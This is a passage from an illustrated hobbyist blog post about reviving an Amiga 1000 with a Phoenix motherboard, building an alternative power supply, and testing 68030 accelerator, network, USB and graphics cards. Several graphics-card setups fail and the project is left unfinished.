<figure><img src="https://i1.wp.com/imgur.com/SdWiBVf.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/SdWiBVf.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/5vhFvEe.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/5vhFvEe.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/JSecjDN.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/JSecjDN.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/ema2Gj3.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/ema2Gj3.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/iPLyCXN.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/iPLyCXN.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/dvlyOz0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/dvlyOz0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/dNT86JL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/dNT86JL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/JrX8CQy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/JrX8CQy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/fpooFLQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/fpooFLQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/Infqadj.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/Infqadj.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Next, I’ve checked for any obvious problems and when I was happy with this inspection, I’ve put it back to a case to simply avoid any accidental short circuits caused by beer-drinking ;P</p>
<p>I’ve decided that I will try to run it with only Indivision ECS2, and KryoFlux GBAPII++ inserted.</p>
<p>I’ve then located the switch setting for the first ROM and put an awesome<a href="http://www.diagrom.com/" target="_blank" rel="noreferrer noopener"> DiagROM by John “<em>Chucky</em>” Hertell</a> in a socket. Yeah, I know, it is a quite a large resistor ;P</p>
<figure><img src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>To my surprise, it worked flawlessly and I was greeted by a known diag info and a menu a bit later.</p>
<figure><img src="https://i0.wp.com/imgur.com/OLe47z8.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/OLe47z8.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/gxM4wyI.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/gxM4wyI.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/DevqDvV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/DevqDvV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/zu2QPUL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/zu2QPUL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Once it worked, I’ve figured that it might be as simple as a flaky ROM socket problem. I’ve put a 2.0 ROM in the place of DiagROM and Viola! It works!</p>
<figure><img src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>When I’ve figured that part out, I could move on and start working on the alternative power supply which was …</p>
<h4>HDPLEX + Uber nice Amiga adapter</h4>
<p>MrTrinsic sent me this HQ HDPLEX Pico PSU but he’d also sent me a very cool DIY KIT – ATX2.0d-Amiga adapter which has super cool features like over-voltage/current protection outputs all needed voltages, and has additional floppy power outputs. Moreover, it generates a TICK signal which is good to have for testing.</p>
<p>However, it was a DIY KIT so I had to solder it all up first.</p>
<figure><img src="https://i1.wp.com/imgur.com/vjNBj6x.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/vjNBj6x.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/wWorjpy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/wWorjpy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/zLxusZT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/zLxusZT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/hQ4rfGh.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/hQ4rfGh.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/IQSyKPj.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/IQSyKPj.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/ksYAoZz.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/ksYAoZz.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/iOkMKIS.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/iOkMKIS.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/kAsBdka.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/kAsBdka.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Combined together, it created an awesome and stable power source for this Amiga project.</p>
<figure><img src="https://i2.wp.com/imgur.com/AeB0dya.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/AeB0dya.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>All I needed to do next was to prepare all the wiring. That was a trivial job after taking some measurements. I’ve used wires from my Nissan Patrol spare wiring kit as these are thick (copper) and nice, hence the color mismatch ;P</p>
<figure><img src="https://i1.wp.com/imgur.com/XoLJW6m.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/XoLJW6m.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/X9KQOAo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/X9KQOAo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/wzAdwin.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/wzAdwin.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/B2j2Lvt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/B2j2Lvt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>It worked like a charm so now I had two working power supplies – original and superior to it HDPLEX with a kickass adapter.</p>
<h4>030 cards</h4>
<p>The next step was about adding 68030 CPU to the system. I had two options as MrTrinsic sent me two different solutions.</p>
<p>The First solution was an <a rel="noreferrer noopener" href="https://icomp.de/shop-icomp/en/produkt-details/product/ACA500plus.html" target="_blank">ACA500plus</a> card along with <a rel="noreferrer noopener" href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank">an ACA1233n</a> accelerator card by Individual Computers. ACA500plus also had an Ethernet add-on – X-Surf 500</p>
<p>These two make a great solution but for AMIGA 500. There are not many folks out there who played it with it in an A1000 and especially with a Phoenix mobo!</p>
<figure><img src="https://i2.wp.com/imgur.com/bTlloDp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/bTlloDp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/sbzmxTx.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/sbzmxTx.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>The first run was promising …</p>
<figure><img src="https://i2.wp.com/imgur.com/LFm6kCo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/LFm6kCo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/FlttUWD.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/FlttUWD.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Then I’ve added ACA1233n on an EXTREMELY WANTED DURING PANDEMIC stand 😀 😀 😀</p>
<figure><img src="https://i0.wp.com/imgur.com/oU3w4xv.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/oU3w4xv.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/BMKsRiL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/BMKsRiL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/pMIcpbV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/pMIcpbV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>To my surprise, it worked!</p>
<figure><img src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/pWIyOlg.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/pWIyOlg.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/GbOnzwF.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/GbOnzwF.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Below, a demo running on this setup</p>
<figure><p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/PJYyBRBnhu8?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>
</p></figure>
<p>The second setup was a bit different. It is made of four devices.</p>
<ul><li>Open 68000 relocator card</li><li>68030 accelerator card </li><li>SDRam + IDE interface</li><li>IDE2CF interface</li></ul>
<p>This setup also appeared to be working nicely after some tests, however as MrTrinsic pointed out, it has some stability issues and will not allow running some software so it was a backup card in case ACA failed. I don’t have a video of it running though.</p>
<figure><img src="https://i0.wp.com/imgur.com/ll5k4FQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/ll5k4FQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/hNND0rK.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/hNND0rK.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/6dDVLSJ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/6dDVLSJ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/9m0vnry.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/9m0vnry.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Other mods and add-ons</h4>
<p>Once accel-cards were tested, I’ve started installing OS and testing other mods. To name the few:</p>
<ul><li>X-surf 500 Ethernet card</li><li>RapidRoad USB</li><li>Indivision ECS v2</li><li>SCSI2SD </li><li>KryoFlux GBAPII++</li></ul>
<figure><img src="https://i0.wp.com/imgur.com/EBLwZFR.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/EBLwZFR.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/i.imgur.com/x7HIGH1.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/x7HIGH1.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/khhqFtb.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/khhqFtb.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/n0qbkbP.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/n0qbkbP.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Indivision ECS v2 and SCSI2SD worked flawlessly so I started playing with other gear.</p>
<figure><img src="https://i1.wp.com/i.imgur.com/p2dSIad.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/p2dSIad.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>After installing all the needed software I’ve finally managed to get an IP addr from my local DHCP server</p>
<figure><img src="https://i1.wp.com/i.imgur.com/DS3Vz0m.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/DS3Vz0m.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/m0IKjsS.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/m0IKjsS.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/XGyz7F0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/XGyz7F0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/OMaE81e.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/OMaE81e.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Obviously, I wouldn’t be myself if I didn’t destroy something. I’ve accidentally connected the RapidRoad USB module to a clock port the other way around. The magic smoke appeared and…</p>
<figure><img src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I had to fix it. After a while, it turned out that only 3R3 resistor was fried.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/GdJIXWt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/GdJIXWt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>I’ve quickly replaced it and started testing USB functionality.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/OXAhtvf.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/OXAhtvf.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/5tzhgLD.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/5tzhgLD.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>GFX cards</h4>
<p>Once all other major mods were working more or less correctly, I could start testing GFX cards high-res modes.</p>
<p>This is where it all started to go wrong …</p>
<p>I had two cards to test with this setup – GBAPII++ by Kryoflux and ZZ9000 by MNT. </p>
<p>GBAPII++ worked nicely only with green 030 cards, but in such config, there would be no Ethernet card.</p>
<figure><img src="https://i0.wp.com/i.imgur.com/GMNmuZ5.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/GMNmuZ5.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/RaE0AYH.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/RaE0AYH.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/x5aY8Sy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/x5aY8Sy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/rxF5KEt.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/rxF5KEt.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Then I’ve tried running ZZ9000 along with green 030 and ACA cards but I’ve encountered autoconfig problems.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/i.imgur.com/JWDIXJ4.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/JWDIXJ4.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/i.imgur.com/G5sFp80.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/G5sFp80.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/j5tkOVP.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/j5tkOVP.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Finally, I’ve focused on ACA500plus with ACA1233n and I just couldn’t make it work. </p>
<p>When ACA was inserted then GBAPII++ was completely invisible to the system.</p>
<p>After updating tons of libraries, firmware and reinstalling OS a few times without any luck, we’ve figured out that it might be a power issue. MrTrinsic ordered an adapter for A500 which would allow pumping in more power.</p>
<p>I’ve first tested it with a stock A500.</p>
<figure><img src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/i.imgur.com/P3Luh0r.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/P3Luh0r.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Same story, GBAPII++ was invisible but I’ve checked it with A1K and power injector adapter just to be sure … unfortunately no luck again.</p>
<figure><img src="https://i0.wp.com/imgur.com/1hkTi44.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1hkTi44.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Unfinished 🙁</h4>
